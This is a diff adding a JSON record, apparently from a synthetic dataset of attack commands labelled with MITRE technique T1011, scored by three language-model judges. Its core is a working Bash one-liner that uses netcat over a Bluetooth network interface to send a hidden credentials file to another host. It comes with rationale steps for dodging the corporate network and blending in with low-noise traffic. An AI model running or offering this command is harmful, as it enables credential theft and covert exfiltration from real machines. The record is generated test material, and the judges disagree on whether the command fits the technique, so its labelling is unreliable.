@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
+  "explanation": "Uses Bluetooth PAN (bnep0) and UDP on a non-standard port to exfiltrate a blob while silently monitoring only that traffic. This is exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Select Bluetooth PAN to avoid the primary corporate network.",
+    "Use UDP on an uncommon port (53287) to blend with low-noise traffic.",
+    "Run tcpdump scoped to bnep0 and that port to minimize footprint.",
+    "Stream the file with netcat bound to the bnep0 source address."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-e5a3a6fa",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid flags, proper redirections, correct backgrounding, and sequential execution.",
+        "semantic_score": 2,
+        "semantic_justification": "It exfiltrates data over a Bluetooth network interface via UDP rather than to a physical medium as described for T1011, and the tcpdump monitoring likely requires elevated privileges.",
+        "combined_score": 3.5,
+        "confidence": 0.75,
+        "timestamp": "2025-10-01T08:17:49.236522Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 by using Bluetooth PAN (bnep0) as a physical medium for exfiltration, though it's technically network-based rather than using removable storage which is more typical for this technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:17:52.644544Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, flags, redirection, and proper backgrounding with no syntax errors.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs network exfiltration via Bluetooth, which does not align with T1011 Exfiltration Over Physical Medium as described, and the `tcpdump` component typically requires elevated privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:18:22.901652Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
